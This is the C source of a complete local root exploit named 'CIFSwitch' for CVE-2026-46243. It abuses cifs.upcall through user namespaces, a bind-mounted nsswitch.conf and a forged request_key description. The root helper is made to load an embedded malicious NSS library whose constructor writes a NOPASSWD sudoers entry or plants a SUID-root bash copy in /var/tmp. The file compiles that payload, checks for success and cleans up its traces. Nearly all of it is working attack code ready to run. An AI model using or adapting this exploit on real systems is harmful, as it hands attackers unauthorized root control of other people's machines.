#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifndef __NR_request_key
#if defined(__x86_64__)
#define __NR_request_key 249
#elif defined(__i386__) || defined(__arm__)
#define __NR_request_key 291
#elif defined(__aarch64__)
#define __NR_request_key 217
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI32
#define __NR_request_key 4249
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_NABI32
#define __NR_request_key 6249
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI64
#define __NR_request_key 5249
#else
#error "unknown __NR_request_key for this arch"
#endif
#endif

#ifndef __NR_keyctl
#if defined(__x86_64__)
#define __NR_keyctl 250
#elif defined(__i386__) || defined(__arm__)
#define __NR_keyctl 288
#elif defined(__aarch64__)
#define __NR_keyctl 220
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI32
#define __NR_keyctl 4246
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_NABI32
#define __NR_keyctl 6246
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI64
#define __NR_keyctl 5246
#else
#error "unknown __NR_keyctl for this arch"
#endif
#endif

#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING -3
#endif

#ifndef KEYCTL_JOIN_SESSION_KEYRING
#define KEYCTL_JOIN_SESSION_KEYRING 1
#endif

static const char NSS_SOURCE[] =
"#define _GNU_SOURCE\n"
"#include <errno.h>\n"
"#include <fcntl.h>\n"
"#include <pwd.h>\n"
"#include <stdio.h>\n"
"#include <stdlib.h>\n"
"#include <string.h>\n"
"#include <unistd.h>\n"
"#include <sys/stat.h>\n"
"#include <sys/types.h>\n"
"\n"
"static void write_all(int fd, const char *buf, size_t len) {\n"
" while (len) { ssize_t r = write(fd, buf, len); if (r <= 0) return; buf += r; len -= (size_t)r; }\n"
"}\n"
"\n"
"__attribute__((constructor))\n"
"static void pwn(void) {\n"
" int lfd = open(EVIDENCE, O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0644);\n"
" if (lfd >= 0) dprintf(lfd, \"NSS loaded by cifs.upcall\\n\");\n"
" mkdir(\"/etc/sudoers.d\", 0755);\n"
" int sfd = open(SUDOERS, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0440);\n"
" if (sfd < 0) {\n"
" if (lfd >= 0) dprintf(lfd, \"sudoers open fail: %m\\n\");\n"
" int ifd = open(\"/bin/bash\", O_RDONLY|O_CLOEXEC);\n"
" int ofd = open(SHELL, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 04755);\n"
" if (ifd >= 0 && ofd >= 0) {\n"
" char buf[8192]; ssize_t n;\n"
" while ((n = read(ifd, buf, sizeof(buf))) > 0) write_all(ofd, buf, (size_t)n);\n"
" fchown(ofd, 0, 0); fchmod(ofd, 04755); fsync(ofd); close(ofd); close(ifd);\n"
" if (lfd >= 0) dprintf(lfd, \"created suid root shell\\n\");\n"
" }\n"
" if (lfd >= 0) close(lfd);\n"
" return;\n"
" }\n"
" const char *c = \"# cifswitch - remove after testing\\n\";\n"
" write_all(sfd, c, strlen(c));\n"
" dprintf(sfd, USER \" ALL=(ALL:ALL) NOPASSWD: ALL\\n\");\n"
" fchmod(sfd, 0440); fsync(sfd); close(sfd);\n"
" if (lfd >= 0) { dprintf(lfd, \"sudoers written for \" USER \"\\n\"); close(lfd); }\n"
"}\n"
"\n"
"enum nss_status _nss_pwn_getpwuid_r(uid_t uid, struct passwd *pwd,\n"
" char *buf, size_t len, int *errnop) {\n"
" const char *n = \"root\", *g = \"root\", *d = \"/root\", *s = \"/bin/bash\";\n"
" size_t need = strlen(n)+strlen(g)+strlen(d)+strlen(s)+4;\n"
" char *p = buf;\n"
" if (len < need) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }\n"
" strcpy(p, n); pwd->pw_name = p; p += strlen(p)+1;\n"
" strcpy(p, g); pwd->pw_gecos = p; p += strlen(p)+1;\n"
" strcpy(p, d); pwd->pw_dir = p; p += strlen(p)+1;\n"
" strcpy(p, s); pwd->pw_shell = p;\n"
" pwd->pw_passwd = (char *)\"x\"; pwd->pw_uid = uid; pwd->pw_gid = 0;\n"
" *errnop = 0; return NSS_STATUS_SUCCESS;\n"
"}\n";

static void die(const char *msg) { perror(msg); exit(1); }

static long xrequest_key(const char *desc) {
 return syscall(__NR_request_key, "cifs.spnego", desc, "",
 KEY_SPEC_SESSION_KEYRING);
}

static void setup_keyring(void) {
 long r = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING,
 "cifswitch", 0, 0, 0);
 if (r < 0) die("KEYCTL_JOIN_SESSION_KEYRING");
}

static void autoload_cifs(void) {
 char mp[] = "/tmp/cif_XXXXXX";
 if (!mkdtemp(mp)) return;
 chmod(mp, 0755);
 pid_t p = fork();
 if (p == 0) {
 int fd = open("/dev/null", O_WRONLY|O_CLOEXEC);
 if (fd >= 0) { dup2(fd, 1); dup2(fd, 2); }
 execlp("mount", "mount", "-t", "cifs", "//127.0.0.1/s", mp,
 "-o", "guest,vers=3.0", NULL);
 _exit(127);
 }
 if (p > 0) { int st; waitpid(p, &st, 0); }
 rmdir(mp);
}

static void mask_dir(const char *path) {
 struct stat st;
 if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode)) return;
 mount("tmpfs", path, "tmpfs", 0, "mode=755");
}

static void bind_nsswitch(const char *src) {
 const char *t[] = {"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf", NULL};
 for (int i = 0; t[i]; i++) {
 struct stat st;
 if (stat(t[i], &st) == 0 && mount(src, t[i], NULL, MS_BIND, NULL) == 0)
 return;
 }
 fprintf(stderr, "[-] no nsswitch bind target found\n");
}

static int write_uid_map(uid_t u) {
 char b[64]; int fd; ssize_t n;
 snprintf(b, sizeof(b), "0 %u 1\n", u);
 fd = open("/proc/self/uid_map", O_WRONLY);
 if (fd < 0) return -1;
 n = write(fd, b, strlen(b)); (void)n; close(fd);
 return 0;
}

static int write_gid_map(gid_t g) {
 char b[64]; int fd; ssize_t n;
 fd = open("/proc/self/setgroups", O_WRONLY);
 if (fd >= 0) { n = write(fd, "deny\n", 5); (void)n; close(fd); }
 snprintf(b, sizeof(b), "0 %u 1\n", g);
 fd = open("/proc/self/gid_map", O_WRONLY);
 if (fd < 0) return -1;
 n = write(fd, b, strlen(b)); (void)n; close(fd);
 return 0;
}

static int has_upcall(void) {
 return access("/usr/sbin/cifs.upcall", F_OK) == 0 ||
 access("/sbin/cifs.upcall", F_OK) == 0;
}

static int user_name(char *out, size_t sz) {
 struct passwd *pw = getpwuid(getuid());
 if (!pw) {
 const char *e = getenv("USER");
 if (!e) return -1;
 snprintf(out, sz, "%s", e);
 return 0;
 }
 snprintf(out, sz, "%s", pw->pw_name);
 return 0;
}

static int has_gcc(void) {
 return system("gcc --version >/dev/null 2>&1") == 0;
}

static int compile_nss(const char *workdir, const char *username) {
 char srcpath[1024], libpath[1024], cmd[4096];
 snprintf(srcpath, sizeof(srcpath), "%s/nss_pwn.c", workdir);
 snprintf(libpath, sizeof(libpath), "%s/%s", workdir, "libnss_pwn.so.2");

 FILE *f = fopen(srcpath, "w");
 if (!f) { perror("write nss src"); return -1; }
 fprintf(f, "%s", NSS_SOURCE);
 fclose(f);

 snprintf(cmd, sizeof(cmd),
 "gcc -shared -fPIC -DUSER=\\\"%s\\\" -DEVIDENCE=\\\"%s/evidence.txt\\\""
 " -DSUDOERS=\\\"%s\\\" -DSHELL=\\\"%s\\\""
 " -o %s %s 2>/dev/null",
 username, workdir, "/etc/sudoers.d/cifswitch_pwn",
 "/var/tmp/cifswitch_rootsh",
 libpath, srcpath);
 int rc = system(cmd);
 if (rc != 0) {
 fprintf(stderr, "[-] NSS compile failed (rc=%d)\n", rc);
 return -1;
 }
 return 0;
}

static int detect_nss_dirs(char dirs[8][256]) {
 const char *cand[] = {
 "/usr/lib64", "/lib64", "/lib/x86_64-linux-gnu",
 "/usr/lib/x86_64-linux-gnu", "/lib/aarch64-linux-gnu",
 "/usr/lib/aarch64-linux-gnu", "/lib", "/usr/lib"
 };
 int n = 0;
 for (int i = 0; i < 8 && n < 8; i++) {
 char p[512];
 snprintf(p, sizeof(p), "%s/libnss_files.so.2", cand[i]);
 if (access(p, F_OK) == 0) {
 strncpy(dirs[n], cand[i], 255);
 dirs[n][255] = 0;
 n++;
 }
 }
 return n;
}

int main(void) {
 char workdir[] = "/tmp/cifswitch_XXXXXX";
 char username[128];
 char nss_dirs[8][256];
 int ndirs;
 int ret = 1;

 setbuf(stdout, NULL);
 setbuf(stderr, NULL);

 printf("[*] CIFSwitch - CVE-2026-46243\n");

 if (!has_upcall()) {
 printf("[-] cifs.upcall not found (cifs-utils not installed?)\n");
 return 1;
 }
 if (!has_gcc()) {
 printf("[-] gcc not found (needed to compile NSS library)\n");
 return 1;
 }
 if (user_name(username, sizeof(username)) != 0) {
 printf("[-] cannot determine user name\n");
 return 1;
 }
 printf("[+] User: %s\n", username);

 ndirs = detect_nss_dirs(nss_dirs);
 if (ndirs == 0) {
 printf("[-] no NSS library directory found\n");
 return 1;
 }
 printf("[+] NSS lib dirs: %d\n", ndirs);

 if (!mkdtemp(workdir)) { perror("mkdtemp"); return 1; }
 printf("[+] Workdir: %s\n", workdir);

 /* write nsswitch.conf */
 {
 char nsp[1024];
 snprintf(nsp, sizeof(nsp), "%s/nsswitch.conf", workdir);
 FILE *f = fopen(nsp, "w");
 if (!f) { perror("nsswitch.conf"); goto out; }
 fprintf(f, "passwd: pwn files\n");
 fprintf(f, "group: pwn files\n");
 fprintf(f, "shadow: files\n");
 fclose(f);
 }

 printf("[*] Compiling NSS library...\n");
 if (compile_nss(workdir, username) != 0) goto out;
 printf("[+] NSS library compiled\n");
 fflush(stdout);

 pid_t child = 0;
 child = fork();
 if (child == 0) {
 /* child: create namespace and trigger upcall */
 if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
 fprintf(stderr, "[-] unshare failed: %s\n", strerror(errno));
 _exit(1);
 }
 if (write_uid_map(getuid()) != 0) { perror("uid_map"); _exit(1); }
 if (write_gid_map(getgid()) != 0) { perror("gid_map"); _exit(1); }

 mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
 autoload_cifs();
 mask_dir("/run/nscd");
 mask_dir("/var/run/nscd");

 {
 char nsp[1024];
 snprintf(nsp, sizeof(nsp), "%s/nsswitch.conf", workdir);
 bind_nsswitch(nsp);
 }

 for (int i = 0; i < ndirs; i++)
 mount(workdir, nss_dirs[i], NULL, MS_BIND | MS_REC, NULL);

 setup_keyring();

 char desc[768];
 snprintf(desc, sizeof(desc),
 "ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"
 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
 getpid());

 printf("[*] Triggering cifs.upcall (pid=%d)...\n", getpid());
 errno = 0;
 long r = xrequest_key(desc);
 printf("[*] request_key: %ld (errno=%d)\n", r, errno);
 sleep(3);
 _exit(0);
 } else if (child > 0) {
 int st;
 waitpid(child, &st, 0);
 } else {
 perror("fork"); child = -1; goto out;
 }

 /* check success */
 {
 struct stat st;
 if (stat("/etc/sudoers.d/cifswitch_pwn", &st) == 0) {
 printf("[+] sudoers entry created\n");
 ret = 0;
 goto out;
 }
 if (stat("/var/tmp/cifswitch_rootsh", &st) == 0) {
 printf("[+] SUID root shell created at /var/tmp/cifswitch_rootsh\n");
 ret = 0;
 goto out;
 }
 printf("[-] No sudoers entry or root shell found\n");
 }

out:
 /* cleanup workdir mounts in child's ns */
 if (child > 0) {
 pid_t c2 = fork();
 if (c2 == 0) {
 if (unshare(CLONE_NEWUSER | CLONE_NEWNS) == 0) {
 for (int i = 0; i < ndirs; i++) {
 struct stat st;
 char p[512];
 snprintf(p, sizeof(p), "%s/%s", workdir, "libnss_pwn.so.2");
 if (stat(p, &st) != 0) continue;
 umount(nss_dirs[i]);
 }
 umount("/etc/nsswitch.conf");
 umount("/usr/etc/nsswitch.conf");
 }
 _exit(0);
 }
 if (c2 > 0) waitpid(c2, NULL, 0);
 }

 /* clean up workdir */
 {
 char p[1024];
 snprintf(p, sizeof(p), "%s/nss_pwn.c", workdir); unlink(p);
 snprintf(p, sizeof(p), "%s/nsswitch.conf", workdir); unlink(p);
 snprintf(p, sizeof(p), "%s/libnss_pwn.so.2", workdir); unlink(p);
 snprintf(p, sizeof(p), "%s/evidence.txt", workdir); unlink(p);
 rmdir(workdir);
 }

 if (ret == 0) {
 printf("[+] Success! Run 'sudo -n sh' for a root shell.\n");
 } else {
 printf("[-] Exploit did not succeed on this system.\n");
 }
 return ret;
}
